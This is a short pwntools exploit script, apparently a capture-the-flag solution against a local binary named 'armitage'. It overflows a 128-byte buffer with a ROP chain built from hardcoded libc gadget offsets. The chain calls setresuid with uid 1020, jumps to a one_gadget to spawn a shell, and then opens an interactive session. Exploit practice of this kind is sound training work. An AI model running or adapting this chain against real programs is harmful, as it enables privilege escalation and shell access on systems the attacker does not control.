from pwn import *

libc_base1 = 0x7ffff7c00000
context.terminal = ['tmux', 'splitw', '-v']
elf = context.binary = "./armitage"
context.arch = "amd64"
elf = ELF(elf)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
setuid = libc.symbols["setresuid"]
rop = ROP(libc)

pop_rdi = 0x10f78b
pop_rsi = 0x2b46b
pop_rdx = 0xb505c
print(hex(libc_base1+setuid))
pop_rbx = 0xa1e1e
one_gadgetaddr = 0x583ec

offset = 136

trash = b"JOB"
trash += b"A" * (128-3)

payload = [
	p64(0x7fffffff0000),
	p64(libc_base1+pop_rdi),
	p64(1020),
	p64(libc_base1+pop_rsi),
	p64(1020),
	p64(1234),
	p64(libc_base1+pop_rdx),
	p64(1020),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(libc_base1+setuid),
	p64(libc_base1+pop_rbx),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(0x01),
	p64(libc_base1+0x2882f), #stack 16-byte alignment
	p64(libc_base1+one_gadgetaddr)
]

chain = b"".join(payload)

final_payload = trash + chain
print(hexdump(final_payload))
with open("payload.bin", "wb") as f:
	f.write(final_payload)


if args.GDB:
	p = gdb.debug("./armitage",
	"""
	define goo
	x/5i $rip
	ni
	end
	b * queue_job+350
	r
	c
	""")
else:
	p = elf.process()
p.sendlineafter(b"yourself: ", final_payload)
print(p.interactive())
